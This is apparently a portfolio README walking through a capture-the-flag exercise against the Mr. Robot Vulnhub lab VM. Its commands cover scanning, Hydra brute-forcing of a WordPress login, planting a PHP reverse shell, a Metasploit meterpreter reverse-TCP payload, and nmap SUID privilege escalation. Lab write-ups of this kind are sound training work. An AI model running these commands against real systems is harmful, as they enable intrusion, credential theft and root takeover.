<div align="center"><h1>Ivan Arias</h1></div>
<div align="center"><h2>Full-Stack Developer | Junior Penetration Tester | AWS Enthusiast</h2></div>

<div id="badges" align="center">
  <a href="https://www.linkedin.com/in/hcoco1/">
    <img src="https://img.shields.io/badge/LinkedIn-blue?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn Badge"/>
  </a>
  <a href="https://www.youtube.com/channel/UCban0ilP3jBC9rdmL-fPy_Q">
    <img src="https://img.shields.io/badge/YouTube-red?style=for-the-badge&logo=youtube&logoColor=white" alt="Youtube Badge"/>
  </a>
  <a href="https://twitter.com/hcoco1">
    <img src="https://img.shields.io/badge/Twitter-blue?style=for-the-badge&logo=twitter&logoColor=white" alt="Twitter Badge"/>
  </a>
</div>  


# Career Simulation 4

## Hacking Mr. Robot Virtual Machine

### by: [**Ivan Arias**](http://www.hcoco1.com) 🧑🏻‍💻 ☠️

### Overview

"Penetration testing is like a security checkup for computer systems. Testers simulate hacker activities to identify and fix vulnerabilities before real hackers can exploit them. This project will conduct a thorough web penetration test using the Mr. Robot Virtual Machine, which simulates realistic web vulnerabilities in a safe environment—allowing for exploring and documenting potential security flaws without affecting real systems.

Every step, finding, and the overall result will be carefully documented throughout the process. This website will present a detailed account of the methodology and outcomes of the penetration testing journey, offering insight into how security assessments are carried out and highlighting the importance of regular security maintenance in preventing cyber attacks."

### [**Live Report**](https://hcoco1.github.io/Career-Simulation-4/) 🧑🏻‍💻 ☠️

## Step 1: Set Up Environment
- **Objective:** Prepare your Kali Linux attacker VM and the Mr. Robot Vulnhub target VM.
- **Actions:**
  - Install necessary software on Kali Linux:
  
    ```bash
    sudo apt update
    sudo apt install -y nmap gobuster hydra metasploit-framework
    ```

## Step 2: Network Scanning
- **Objective:** Identify the target's open ports and services.
- **Tools:** Nmap
- **Commands:**
    ```bash
    nmap -sS -sV -O 192.168.1.226
    ```

## Step 3: Enumeration
- **Objective:** Gather detailed information about the target's web applications and technologies.
- **Tools:** Gobuster, Wappalyzer
- **Commands:**
    ```bash
    gobuster dir -u http://192.168.1.226 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ```
  - Use Wappalyzer browser extension to identify web technologies used by the target site.

## Step 4: Vulnerabilities
- **Objective:** Identify vulnerabilities in the target's web applications and services.
- **Tools:** Nmap, Nikto
- **Commands:**
    ```bash
    nmap --script vuln 192.168.1.226
    nikto -h http://192.168.1.226
    ```

## Step 5: Brute-force
- **Objective:** Gain access to the target by brute-forcing login credentials.
- **Tools:** Hydra
- **Commands:**
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.226 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
    ```

## Step 6: Reverse Shell
- **Objective:** Gain remote access to the target system.
- **Tools:** PHP Reverse Shell, Metasploit

### Manual PHP Reverse Shell
1. **Upload a PHP Reverse Shell:**
   - Go to the WordPress admin panel at `http://192.168.1.226/wp-admin` and log in using the credentials found or brute-forced.
   - Navigate to Appearance > Theme Editor, select the `404.php` file, and insert the PHP reverse shell code from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

2. **Start a Netcat Listener:**
    ```bash
    nc -lvnp 4444
    ```

3. **Trigger the Reverse Shell:**
   - Visit the modified `404.php` file in your browser to trigger the reverse shell.
    ```bash
    http://192.168.1.226/wp-content/themes/[your-theme]/404.php
    ```

### Using Metasploit
1. **Start Metasploit:**
    ```bash
    msfconsole
    ```

2. **Select the Exploit Module:**
    ```bash
    use exploit/unix/webapp/wp_admin_shell_upload
    ```

3. **Set Required Options:**
    ```bash
    set RHOSTS 192.168.1.226
    set RPORT 80
    set USERNAME elliot
    set PASSWORD ER28-0652
    set TARGETURI /
    set LHOST 192.168.1.223
    set LPORT 4444
    set payload php/meterpreter/reverse_tcp
    set VERBOSE true
    ```

4. **Run the Exploit:**
    ```bash
    exploit
    ```

5. **Interacting with Meterpreter:**
    ```plaintext
    meterpreter > shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

6. **Navigating the File System:**
    ```bash
    cd /home/robot
    ls -a
    cat key-1-of-3.txt
    cat key-2-of-3.txt
    ```

### Privilege Escalation (if needed)
- **Identify SUID binaries:**
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```

- **Exploit Nmap for Privilege Escalation:**
    ```bash
    /usr/local/bin/nmap --interactive
    !sh
    ```

- **Read the Final Key:**
    ```bash
    find / -name "key-3-of-3.txt" 2>/dev/null
    cat /root/key-3-of-3.txt
    ```

### Clean Up
1. **Remove Uploaded Files:**
    ```bash
    rm /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php
    rm -rf /wp-content/plugins/lCXSKnpNHP
    ```

